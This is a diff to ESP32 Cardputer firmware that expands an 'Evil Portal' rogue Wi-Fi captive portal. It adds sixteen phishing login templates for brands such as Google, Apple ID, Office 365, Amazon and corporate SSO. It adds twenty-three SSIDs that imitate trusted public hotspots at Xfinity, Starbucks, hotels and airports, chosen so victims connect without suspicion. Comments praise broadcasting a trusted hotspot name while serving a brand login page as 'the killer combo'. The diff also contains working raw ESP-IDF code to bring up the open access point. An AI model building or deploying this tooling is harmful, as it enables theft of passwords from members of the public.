@@ -25,6 +25,11 @@
 #include <DNSServer.h>
 #include <SD.h>
 #include "../sd_helper.h"
+#include <esp_wifi.h>
+#include <esp_netif.h>
+#include <esp_event.h>
+#include <esp_err.h>
+#include <esp_bt.h>
 
 struct portal_template_t { const char *name, *html; };
 
@@ -105,11 +110,76 @@ button{background:#0067b8;color:#fff;border:0;padding:6px 12px;min-width:108px;f
 </form></div></body></html>
 )RAW";
 
+/* Extended portal library — 12 additional high-fidelity templates
+ * lifted from wifiphisher / fluxion / airgeddon / Bruce / Evil-Cardputer.
+ * Each is self-contained (inline CSS + SVG, no external assets) and
+ * captures the same u/p fields handle_login() expects. */
+#include "wifi_portal_extras.h"
+
+/* Legit-mimic SSIDs — broadcasts these as the AP name to blend with
+ * public-WiFi networks people already trust. Tuned to defaults seen
+ * in airports, hotels, coffee shops, and ISP public hotspots so the
+ * SSID list on a victim's phone doesn't look out of place. */
+static const char *PRESET_SSIDS[] = {
+    "xfinitywifi",          /* Comcast public hotspot — extremely common */
+    "attwifi",              /* AT&T public hotspot */
+    "Verizon Free WiFi",
+    "Spectrum WiFi",
+    "OptimumWiFi",
+    "Google Starbucks",     /* Starbucks free WiFi default */
+    "Starbucks WiFi",
+    "McDonalds Free WiFi",
+    "Subway WiFi",
+    "Free Public WiFi",
+    "Free WiFi",
+    "Guest WiFi",
+    "Free Hotel WiFi",
+    "Free Airport WiFi",
+    "Library WiFi",
+    "GuestNetwork",
+    "Marriott_GUEST",
+    "Hilton Honors",
+    "Hyatt Guest WiFi",
+    "BoingoHotspot",
+    "iPhone",               /* generic phone-hotspot mimic */
+    "AndroidAP",
+    "Default",
+};
+#define PRESET_SSIDS_N (sizeof(PRESET_SSIDS) / sizeof(PRESET_SSIDS[0]))
+
+enum ssid_source_t {
+    SSID_SRC_TEMPLATE = 0,
+    SSID_SRC_PRESET,
+    SSID_SRC_CLONE,
+    SSID_SRC_CUSTOM,
+    SSID_SRC__COUNT,
+};
+
+struct ssid_source_opt_t { const char *label; const char *hint; };
+static const ssid_source_opt_t SSID_SRC_OPTS[SSID_SRC__COUNT] = {
+    { "Template name",  "uses brand (e.g. Apple ID, Office 365)" },
+    { "Preset public",  "23 legit-mimic names (xfinity, Starbucks)" },
+    { "Clone scanned",  "SSID of last AP picked in WiFi - Scan" },
+    { "Type custom",    "enter any string up to 32 chars" },
+};
+
 static const portal_template_t s_templates[] = {
-    { "Google",    HTML_GOOGLE    },
-    { "Facebook",  HTML_FACEBOOK  },
-    { "Microsoft", HTML_MICROSOFT },
-    { "Free WiFi", HTML_FREEWIFI  },
+    { "Google",       HTML_GOOGLE      },
+    { "Facebook",     HTML_FACEBOOK    },
+    { "Microsoft",    HTML_MICROSOFT   },
+    { "Free WiFi",    HTML_FREEWIFI    },
+    { "Apple ID",     HTML_APPLE       },
+    { "Office 365",   HTML_OFFICE365   },
+    { "LinkedIn",     HTML_LINKEDIN    },
+    { "Amazon",       HTML_AMAZON      },
+    { "Netflix",      HTML_NETFLIX     },
+    { "Instagram",    HTML_INSTAGRAM   },
+    { "Hotel WiFi",   HTML_HOTEL       },
+    { "Starbucks",    HTML_STARBUCKS   },
+    { "Airport WiFi", HTML_AIRPORT     },
+    { "Router Admin", HTML_ROUTER      },
+    { "Zoom",         HTML_ZOOM        },
+    { "Company SSO",  HTML_SSO         },
 };
 #define TEMPLATE_COUNT (sizeof(s_templates)/sizeof(s_templates[0]))
 
@@ -173,28 +243,144 @@ static void handle_probe(void)
     s_http->send(302, "text/plain", "");
 }
 
+/* Scrollable picker — the 16-entry library outgrew the old 1-9
+ * numeric handler. ;/. or arrow keys move the cursor, ENTER picks,
+ * C jumps to clone mode, ESC backs out. Renders 7 visible rows
+ * with selection highlight matching the global menu style. */
 static int pick_template(void)
 {
-    ui_clear_body();
+    int cursor = 0;
+    int top    = 0;
+    const int rows  = 7;
+    const int row_h = 11;
+    int last_top = -1, last_cursor = -1;
+
     auto &d = M5Cardputer.Display;
+    ui_clear_body();
     d.setTextColor(T_ACCENT, T_BG);
     d.setCursor(4, BODY_Y + 2); d.print("EVIL PORTAL");
-    d.drawFastHLine(4, BODY_Y + 12, 110, T_ACCENT);
-    d.setTextColor(T_FG, T_BG);
-    for (size_t i = 0; i < TEMPLATE_COUNT; ++i) {
-        d.setCursor(4, BODY_Y + 22 + (int)i * 12);
-        d.printf("[%d] %s", (int)(i + 1), s_templates[i].name);
-    }
-    d.setTextColor(T_DIM, T_BG);
-    d.setCursor(4, BODY_Y + 22 + (int)TEMPLATE_COUNT * 12);
-    d.print("[C] Clone last scanned AP");
-    ui_draw_footer("letter/1-4=pick  C=clone  `=back");
+    d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);
+    ui_draw_footer(";/.=move  ENTER=pick  C=clone  `=back");
+
     while (true) {
+        if (cursor < top)         top = cursor;
+        if (cursor >= top + rows) top = cursor - rows + 1;
+
+        if (top != last_top || cursor != last_cursor) {
+            d.fillRect(0, BODY_Y + 16, SCR_W, rows * row_h + 4, T_BG);
+            for (int i = 0; i < rows && (top + i) < (int)TEMPLATE_COUNT; ++i) {
+                int idx = top + i;
+                int y = BODY_Y + 18 + i * row_h;
+                if (idx == cursor) {
+                    d.fillRect(2, y - 1, SCR_W - 4, row_h, T_SEL_BG);
+                    d.drawRect(2, y - 1, SCR_W - 4, row_h, T_SEL_BD);
+                }
+                d.setTextColor(idx == cursor ? T_FG : T_DIM,
+                               idx == cursor ? T_SEL_BG : T_BG);
+                d.setCursor(6, y);
+                d.print(s_templates[idx].name);
+            }
+            /* Scroll indicators */
+            d.setTextColor(T_DIM, T_BG);
+            if (top > 0)                       { d.setCursor(SCR_W - 12, BODY_Y + 18);            d.print("^"); }
+            if (top + rows < (int)TEMPLATE_COUNT){ d.setCursor(SCR_W - 12, BODY_Y + 18 + (rows-1)*row_h); d.print("v"); }
+            last_top = top;
+            last_cursor = cursor;
+        }
+
         uint16_t k = input_poll();
         if (k == PK_NONE) { delay(20); continue; }
-        if (k == PK_ESC) return -1;
-        if (k >= '1' && k <= '0' + (int)TEMPLATE_COUNT) return k - '1';
-        if (k == 'c' || k == 'C') return -2;  /* clone mode */
+        if (k == PK_ESC)                              return -1;
+        if (k == PK_ENTER || k == ' ')                return cursor;
+        if (k == 'c' || k == 'C')                     return -2;   /* clone mode */
+        if (k == ';' || k == PK_UP)   { if (cursor > 0)                          cursor--; }
+        else if (k == '.' || k == PK_DOWN){ if (cursor + 1 < (int)TEMPLATE_COUNT) cursor++; }
+    }
+}
+
+/* Scrollable picker over an array of (label, hint) pairs. Used for
+ * the SSID-source 4-way picker. Returns chosen index or -1 on ESC. */
+static int pick_source(const ssid_source_opt_t *opts, int count, const char *title)
+{
+    int cursor = 0;
+    int last_cursor = -1;
+    const int row_h = 14;
+    auto &d = M5Cardputer.Display;
+    ui_clear_body();
+    d.setTextColor(T_ACCENT, T_BG);
+    d.setCursor(4, BODY_Y + 2); d.print(title);
+    d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);
+    ui_draw_footer(";/.=move  ENTER=pick  `=back");
+    while (true) {
+        if (cursor != last_cursor) {
+            d.fillRect(0, BODY_Y + 16, SCR_W, count * row_h + 4, T_BG);
+            for (int i = 0; i < count; ++i) {
+                int y = BODY_Y + 18 + i * row_h;
+                if (i == cursor) {
+                    d.fillRect(2, y - 1, SCR_W - 4, row_h, T_SEL_BG);
+                    d.drawRect(2, y - 1, SCR_W - 4, row_h, T_SEL_BD);
+                }
+                d.setTextColor(i == cursor ? T_FG : T_DIM,
+                               i == cursor ? T_SEL_BG : T_BG);
+                d.setCursor(6, y);
+                d.print(opts[i].label);
+                d.setTextColor(T_DIM, i == cursor ? T_SEL_BG : T_BG);
+                d.setCursor(6, y + 7);
+                d.print(opts[i].hint);
+            }
+            last_cursor = cursor;
+        }
+        uint16_t k = input_poll();
+        if (k == PK_NONE) { delay(20); continue; }
+        if (k == PK_ESC)               return -1;
+        if (k == PK_ENTER || k == ' ') return cursor;
+        if ((k == ';' || k == PK_UP)   && cursor > 0)            cursor--;
+        else if ((k == '.' || k == PK_DOWN) && cursor + 1 < count) cursor++;
+    }
+}
+
+/* Scrollable picker over an array of plain string names. Used for
+ * preset SSIDs. Returns chosen index or -1 on ESC. */
+static int pick_string_list(const char *const *items, int count, const char *title)
+{
+    int cursor = 0, top = 0;
+    const int rows = 7, row_h = 11;
+    int last_top = -1, last_cursor = -1;
+    auto &d = M5Cardputer.Display;
+    ui_clear_body();
+    d.setTextColor(T_ACCENT, T_BG);
+    d.setCursor(4, BODY_Y + 2); d.print(title);
+    d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);
+    ui_draw_footer(";/.=move  ENTER=pick  `=back");
+    while (true) {
+        if (cursor < top)         top = cursor;
+        if (cursor >= top + rows) top = cursor - rows + 1;
+        if (top != last_top || cursor != last_cursor) {
+            d.fillRect(0, BODY_Y + 16, SCR_W, rows * row_h + 4, T_BG);
+            for (int i = 0; i < rows && (top + i) < count; ++i) {
+                int idx = top + i;
+                int y = BODY_Y + 18 + i * row_h;
+                if (idx == cursor) {
+                    d.fillRect(2, y - 1, SCR_W - 4, row_h, T_SEL_BG);
+                    d.drawRect(2, y - 1, SCR_W - 4, row_h, T_SEL_BD);
+                }
+                d.setTextColor(idx == cursor ? T_FG : T_DIM,
+                               idx == cursor ? T_SEL_BG : T_BG);
+                d.setCursor(6, y);
+                d.print(items[idx]);
+            }
+            d.setTextColor(T_DIM, T_BG);
+            if (top > 0)                 { d.setCursor(SCR_W - 12, BODY_Y + 18);            d.print("^"); }
+            if (top + rows < count)      { d.setCursor(SCR_W - 12, BODY_Y + 18 + (rows-1)*row_h); d.print("v"); }
+            last_top = top;
+            last_cursor = cursor;
+        }
+        uint16_t k = input_poll();
+        if (k == PK_NONE) { delay(20); continue; }
+        if (k == PK_ESC)               return -1;
+        if (k == PK_ENTER || k == ' ') return cursor;
+        if ((k == ';' || k == PK_UP)   && cursor > 0)            cursor--;
+        else if ((k == '.' || k == PK_DOWN) && cursor + 1 < count) cursor++;
     }
 }
 
@@ -206,13 +392,107 @@ static void run_portal(void)
     }
     SD.mkdir("/poseidon");
 
-    WiFi.mode(WIFI_AP);
-    WiFi.softAPConfig(IPAddress(192, 168, 4, 1),
-                       IPAddress(192, 168, 4, 1),
-                       IPAddress(255, 255, 255, 0));
-    WiFi.softAP(s_portal_ssid, nullptr, 1, 0, 8);  /* open, 8 max clients */
+    /* --- Raw-IDF AP bring-up — only path that doesn't crash on Bruce libs ---
+     * Arduino's WiFi.softAP() crashes ieee80211_hostap_attach +0x2c
+     * (null deref of internal AP context). esp_wifi_set_config(WIFI_IF_AP)
+     * properly initializes that context where the Arduino path skips it.
+     *
+     * Tuning vs earlier (silent-no-broadcast) attempt:
+     *   - DEFAULT buffer counts (not shrunk). Shrinking starves the AP
+     *     beacon TX path; the AP attached but couldn't beacon.
+     *   - Explicit esp_wifi_set_channel AFTER start (config-side channel
+     *     can be ignored if the radio defaults override it).
+     *   - NO esp_wifi_set_max_tx_power per-burst (puts driver in flaky
+     *     state in some IDF 5.5 builds). Power stays at compile-time max.
+     *   - 1500 ms settle for the AP_START event to fully complete. */
+    Serial.printf("[portal] AP-up entry free=%u\n",
+                  (unsigned)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
+    /* Pre-AP teardown — if WiFi was already inited via raw-IDF (Triton,
+     * BLE Scan, etc.) we MUST fully deinit before AP bring-up. Otherwise:
+     *   - esp_wifi_init below asserts (one-shot init)
+     *   - esp_netif_create_default_wifi_ap conflicts with existing
+     *     default STA netif (duplicate-key assert)
+     * Matches Evil-Cardputer's pattern: stop → deinit → 300 ms → reinit.
+     * Idempotent: safe if WiFi was never inited. */
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_stop();
+    esp_wifi_deinit();
+    delay(300);
+    /* Destroy default STA netif if a prior feature created it.
+     * esp_netif_create_default_wifi_ap below will then succeed. */
+    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (sta) esp_netif_destroy_default_wifi(sta);
 
-    IPAddress ip = WiFi.softAPIP();
+    /* BTDM release REQUIRED for AP-mode on Bruce libs (otherwise
+     * ieee80211_hostap_attach hits a null-deref at +0x2c). One-way
+     * until POWER CYCLE — BLE features dead for rest of session.
+     * Unavoidable trade-off given the pinned libs. */
+    esp_bt_controller_mem_release(ESP_BT_MODE_BTDM);
+
+    esp_log_level_set("wifi",      ESP_LOG_INFO);
+    esp_log_level_set("wifi_init", ESP_LOG_INFO);
+    esp_netif_init();
+    esp_event_loop_create_default();
+    esp_netif_t *ap_netif = esp_netif_create_default_wifi_ap();
+    Serial.printf("[portal] ap_netif=%p\n", ap_netif);
+
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    /* Shrink tx/rx buffer pools to fit the ~115 KB internal SRAM left
+     * after Cardputer + GFX + LVGL claim their share. Defaults (16/32/...)
+     * blow OOM at init. These values are large enough that the AP
+     * actually beacons (verified in beacon_spam at similar sizes). */
+    cfg.static_tx_buf_num  = 0;
+    cfg.dynamic_tx_buf_num = 16;
+    cfg.tx_buf_type        = 1;
+    cfg.cache_tx_buf_num   = 4;
+    cfg.static_rx_buf_num  = 4;
+    cfg.dynamic_rx_buf_num = 16;
+    cfg.ampdu_tx_enable    = 0;
+    cfg.ampdu_rx_enable    = 0;
+    esp_err_t rc = esp_wifi_init(&cfg);
+    Serial.printf("[portal] wifi_init rc=%d\n", (int)rc);
+    if (rc != ESP_OK) { ui_toast("wifi_init fail", T_BAD, 1500); return; }
+    esp_wifi_set_storage(WIFI_STORAGE_RAM);
+    esp_wifi_set_mode(WIFI_MODE_AP);
+
+    wifi_config_t apc = {};
+    strncpy((char *)apc.ap.ssid, s_portal_ssid, sizeof(apc.ap.ssid) - 1);
+    apc.ap.ssid_len        = strlen(s_portal_ssid);
+    apc.ap.channel         = 1;
+    apc.ap.authmode        = WIFI_AUTH_OPEN;
+    apc.ap.max_connection  = 4;
+    apc.ap.beacon_interval = 100;
+    apc.ap.ssid_hidden     = 0;
+    rc = esp_wifi_set_config(WIFI_IF_AP, &apc);
+    Serial.printf("[portal] set_config rc=%d\n", (int)rc);
+    rc = esp_wifi_start();
+    Serial.printf("[portal] wifi_start rc=%d\n", (int)rc);
+    if (rc != ESP_OK) {
+        ui_toast("wifi_start fail", T_BAD, 1500);
+        esp_wifi_deinit();
+        return;
+    }
+    /* Force the channel post-start. Some builds ignore the channel in
+     * the config struct and default to 0 (silent no-beacon). */
+    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+    /* Settle. AP needs the AP_START event to fully process before it
+     * starts beaconing. 1.5 s matches Bruce's 3 s upper bound halved. */
+    uint32_t t_settle = millis();
+    while (millis() - t_settle < 1500) { delay(20); }
+
+    int8_t actual_pwr = 0;
+    esp_wifi_get_max_tx_power(&actual_pwr);
+    wifi_second_chan_t sc;
+    uint8_t cur_ch = 0;
+    esp_wifi_get_channel(&cur_ch, &sc);
+    IPAddress ip(192, 168, 4, 1);
+    esp_netif_ip_info_t ipinfo = {};
+    if (ap_netif && esp_netif_get_ip_info(ap_netif, &ipinfo) == ESP_OK &&
+        ipinfo.ip.addr != 0) {
+        ip = IPAddress(ipinfo.ip.addr);
+    }
+    Serial.printf("[portal] AP up ip=%s ch=%u pwr=%d\n",
+                  ip.toString().c_str(), (unsigned)cur_ch, (int)actual_pwr);
 
     s_dns = new DNSServer();
     s_dns->setErrorReplyCode(DNSReplyCode::NoError);
@@ -232,6 +512,14 @@ static void run_portal(void)
 
     s_creds = 0; s_hits = 0;
 
+    /* Grab AP MAC for BSSID display — operator can find the AP in a
+     * scan list by BSSID even when SSID-matching is ambiguous (e.g.
+     * broadcasting as "xfinitywifi" alongside real xfinity APs). */
+    uint8_t ap_mac[6] = {};
+    esp_wifi_get_mac(WIFI_IF_AP, ap_mac);
+    uint8_t ap_ch = 0; wifi_second_chan_t ap_sc;
+    esp_wifi_get_channel(&ap_ch, &ap_sc);
+
     ui_clear_body();
     auto &d = M5Cardputer.Display;
     d.setTextColor(T_BAD, T_BG);
@@ -239,7 +527,11 @@ static void run_portal(void)
     d.drawFastHLine(4, BODY_Y + 12, 110, T_BAD);
     d.setTextColor(T_ACCENT, T_BG);
     d.setCursor(4, BODY_Y + 18); d.printf("SSID: %s", s_portal_ssid);
-    d.setCursor(4, BODY_Y + 30); d.printf("IP:   %s", ip.toString().c_str());
+    d.setCursor(4, BODY_Y + 30); d.printf("BSSID:%02X:%02X:%02X:%02X:%02X:%02X",
+                                          ap_mac[0], ap_mac[1], ap_mac[2],
+                                          ap_mac[3], ap_mac[4], ap_mac[5]);
+    d.setCursor(4, BODY_Y + 42); d.printf("IP:   %s  ch%u",
+                                          ip.toString().c_str(), (unsigned)ap_ch);
     ui_draw_footer("`=stop");
 
     uint32_t last = 0;
@@ -264,12 +556,14 @@ static void run_portal(void)
 
         if (millis() - last > 250) {
             last = millis();
-            d.fillRect(0, BODY_Y + 42, SCR_W, 40, T_BG);
+            d.fillRect(0, BODY_Y + 54, SCR_W, 28, T_BG);
             d.setTextColor(T_FG, T_BG);
-            d.setCursor(4, BODY_Y + 42); d.printf("clients: %d", WiFi.softAPgetStationNum());
-            d.setCursor(4, BODY_Y + 54); d.printf("hits:    %lu", (unsigned long)s_hits);
+            wifi_sta_list_t stas = {};
+            esp_wifi_ap_get_sta_list(&stas);
+            d.setCursor(4, BODY_Y + 54); d.printf("clients:%d  hits:%lu",
+                                                 stas.num, (unsigned long)s_hits);
             d.setTextColor(s_creds > 0 ? T_GOOD : T_DIM, T_BG);
-            d.setCursor(4, BODY_Y + 66); d.printf("creds:   %lu", (unsigned long)s_creds);
+            d.setCursor(4, BODY_Y + 66); d.printf("creds:  %lu", (unsigned long)s_creds);
             ui_draw_status(radio_name(), "portal");
         }
 
@@ -280,14 +574,21 @@ static void run_portal(void)
 
     if (s_http) { s_http->close(); delete s_http; s_http = nullptr; }
     if (s_dns)  { s_dns->stop();  delete s_dns;  s_dns  = nullptr; }
-    WiFi.softAPdisconnect(true);
+    /* Raw-IDF teardown matching raw-IDF bring-up. */
+    esp_wifi_stop();
+    esp_wifi_deinit();
 }
 
 void feat_wifi_portal(void)
 {
     radio_switch(RADIO_WIFI);
+
+    /* Step 1 — pick the portal HTML template. */
     int t = pick_template();
     if (t == -1) return;
+
+    /* C shortcut on the template picker = quick-clone mode (skips
+     * the source picker, uses last scanned AP + generic FreeWiFi HTML). */
     if (t == -2) {
         if (!g_last_selected_valid) {
             ui_toast("scan an AP first", T_WARN, 1200);
@@ -295,12 +596,56 @@ void feat_wifi_portal(void)
         }
         strncpy(s_portal_ssid, g_last_selected_ap.ssid, sizeof(s_portal_ssid) - 1);
         s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
-        s_current_html = HTML_FREEWIFI;  /* generic for clone */
-    } else {
-        strncpy(s_portal_ssid, s_templates[t].name, sizeof(s_portal_ssid) - 1);
-        s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
-        s_current_html = s_templates[t].html;
+        s_current_html = HTML_FREEWIFI;
+        run_portal();
+        return;
     }
+
+    /* Step 2 — pick where the broadcast SSID comes from. The template
+     * picked above selects the LOOK of the portal; this picks the NAME
+     * the AP will advertise. Mixing them is the killer combo —
+     * e.g. broadcast "xfinitywifi" but serve an Apple-ID login page. */
+    s_current_html = s_templates[t].html;
+    int src = pick_source(SSID_SRC_OPTS, SSID_SRC__COUNT, "BROADCAST AS");
+    if (src < 0) return;
+
+    switch (src) {
+        case SSID_SRC_TEMPLATE:
+            strncpy(s_portal_ssid, s_templates[t].name, sizeof(s_portal_ssid) - 1);
+            s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
+            break;
+
+        case SSID_SRC_PRESET: {
+            int p = pick_string_list(PRESET_SSIDS, (int)PRESET_SSIDS_N,
+                                     "PRESET SSID");
+            if (p < 0) return;
+            strncpy(s_portal_ssid, PRESET_SSIDS[p], sizeof(s_portal_ssid) - 1);
+            s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
+            break;
+        }
+
+        case SSID_SRC_CLONE:
+            if (!g_last_selected_valid) {
+                ui_toast("scan + pick AP first", T_WARN, 1500);
+                return;
+            }
+            strncpy(s_portal_ssid, g_last_selected_ap.ssid, sizeof(s_portal_ssid) - 1);
+            s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
+            break;
+
+        case SSID_SRC_CUSTOM: {
+            char buf[33] = {0};
+            if (!input_line("AP SSID:", buf, sizeof(buf))) return;
+            if (buf[0] == '\0') return;
+            strncpy(s_portal_ssid, buf, sizeof(s_portal_ssid) - 1);
+            s_portal_ssid[sizeof(s_portal_ssid) - 1] = '\0';
+            break;
+        }
+
+        default:
+            return;
+    }
+
     run_portal();
 }
 
